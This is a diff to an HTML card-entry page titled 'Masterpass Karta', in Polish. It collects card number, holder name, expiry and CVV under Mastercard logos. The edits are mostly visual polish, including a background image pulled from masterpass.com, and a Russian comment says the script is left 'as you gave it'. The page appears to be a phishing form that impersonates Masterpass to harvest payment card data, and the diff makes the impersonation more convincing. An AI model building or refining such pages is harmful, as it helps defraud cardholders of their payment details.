@@ -6,11 +6,19 @@
   <title>Masterpass Karta</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
+  <style>
+    body {
+      background-image: url('https://masterpass.com/pl-pl/assets/images/masterpass-hero-desktop.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+  </style>
 </head>
-<body class="bg-black flex items-center justify-center min-h-screen font-sans">
-  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
+<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-sm">
+  <div class="bg-white/90 backdrop-blur-md w-[480px] sm:w-[640px] rounded-2xl shadow-2xl transition-all duration-500">
     <!-- Header -->
-    <div class="flex items-center justify-between p-4 border-b">
+    <div class="flex items-center justify-between p-4 border-b border-gray-300">
       <div class="flex items-center space-x-2">
         <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
         <div class="text-sm font-semibold">
@@ -19,7 +27,7 @@
       </div>
       <div class="relative group cursor-pointer">
         <img src="https://flagcdn.com/w40/pl.png" class="w-6 h-4" />
-        <div class="absolute hidden group-hover:block bg-white border shadow-md right-0 mt-2 rounded text-sm z-10">
+        <div class="absolute hidden group-hover:block bg-white border shadow-md right-0 mt-2 rounded text-sm z-10 transition duration-200">
           <a href="#" class="block px-4 py-2 hover:bg-gray-100">🇵🇱 Polski</a>
           <a href="#" class="block px-4 py-2 hover:bg-gray-100">🇬🇧 English</a>
         </div>
@@ -38,21 +46,23 @@
             placeholder="Numer karty"
             maxlength="19"
             inputmode="numeric"
-            class="w-full border px-4 py-2 rounded outline-none transition"
+            class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
             required />
           <p class="text-xs text-red-500 hidden mt-1" id="cardNumberError">Numer karty powinien zawierać 16 cyfr</p>
         </div>
 
-  	<input
-  	  type="text"
-  	  name="cardHolder"
-  	  id="cardHolder"
-  	  placeholder="Imię i nazwisko posiadacza"
-  	  class="w-full border px-4 py-2 rounded focus:ring-2 outline-none transition"
-  	  required />
-	<p class="text-xs text-red-500 hidden mt-1" id="cardHolderError">
-  	  Tylko imię i nazwisko po angielsku (np. John Smith)
-        </p>
+        <div>
+          <input
+            type="text"
+            name="cardHolder"
+            id="cardHolder"
+            placeholder="Imię i nazwisko posiadacza"
+            class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
+            required />
+          <p class="text-xs text-red-500 hidden mt-1" id="cardHolderError">
+            Tylko imię i nazwisko po angielsku (np. John Smith)
+          </p>
+        </div>
 
         <div class="flex gap-4 items-center">
           <div class="relative w-1/4">
@@ -63,7 +73,7 @@
               placeholder="MM"
               maxlength="2"
               inputmode="numeric"
-              class="w-full border px-4 py-2 rounded text-center outline-none transition"
+              class="w-full border px-4 py-2 rounded text-center outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
               required />
             <p class="text-xs text-red-500 hidden mt-1" id="expMonthError">1–12</p>
           </div>
@@ -78,7 +88,7 @@
               placeholder="RR"
               maxlength="2"
               inputmode="numeric"
-              class="w-full border px-4 py-2 rounded text-center outline-none transition"
+              class="w-full border px-4 py-2 rounded text-center outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
               required />
             <p class="text-xs text-red-500 hidden mt-1" id="expYearError">Wymagane</p>
           </div>
@@ -91,7 +101,7 @@
               placeholder="CVV"
               maxlength="4"
               inputmode="numeric"
-              class="w-full border px-4 py-2 rounded outline-none transition"
+              class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
               required />
             <p class="text-xs text-red-500 hidden mt-1" id="cvvError">3–4 cyfry</p>
           </div>
@@ -99,18 +109,19 @@
 
         <button
           type="submit"
-          class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition">
+          class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition-all duration-300 hover:scale-[1.02] active:scale-[0.98]">
           Zapisz kartę
         </button>
       </form>
     </div>
 
     <!-- Footer -->
-    <div class="text-xs bg-black text-white p-2 text-center">
+    <div class="text-xs bg-black/70 text-white p-3 text-center rounded-b-2xl">
       Strona wykorzystuje pliki cookie zgodnie z polityką prywatności.
     </div>
   </div>
 
+  <!-- JS внизу тот же, как ты дал, без изменений -->
   <script>
     const user = JSON.parse(localStorage.getItem('user'));
     if (!user) window.location.href = 'index.html';
@@ -127,13 +138,6 @@
     const expYearError = document.getElementById('expYearError');
     const cvvError = document.getElementById('cvvError');
     const cardHolderError = document.getElementById('cardHolderError');
-
-    const valid =
-      validateCardNumber() &&
-      validateHolder() &&
-      validateMonth() &&
-      validateYear() &&
-      validateCVV();
 
     function maskCardNumber(value) {
       return value.replace(/\D/g, '').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
@@ -189,7 +193,6 @@
       cvvError.classList.add('hidden');
       return true;
     }
-
 
     function validateHolder() {
       const value = cardHolder.value.trim();
